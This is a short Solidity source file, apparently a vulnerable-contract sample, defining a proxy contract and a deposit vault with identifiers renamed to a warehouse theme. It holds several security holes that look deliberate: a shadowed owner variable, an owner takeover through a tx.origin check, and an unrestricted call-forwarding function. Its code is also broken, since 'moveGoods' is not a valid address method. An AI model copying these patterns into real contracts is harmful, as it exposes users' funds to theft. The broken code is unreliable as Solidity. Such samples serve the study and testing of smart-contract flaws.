pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyWarehousemanager { if (msg.sender == WarehouseManager) _; } address WarehouseManager = msg.sender;
    function relocatecargoLogisticsadmin(address _warehousemanager) public onlyWarehousemanager { WarehouseManager = _warehousemanager; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract StoragevaultProxy is Proxy {
    address public WarehouseManager;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function InventoryVault() public payable {
        if (msg.sender == tx.origin) {
            WarehouseManager = msg.sender;
            storeGoods();
        }
    }

    function storeGoods() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function deliverGoods(uint256 amount) public onlyWarehousemanager {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.moveGoods(amount);
        }
    }
}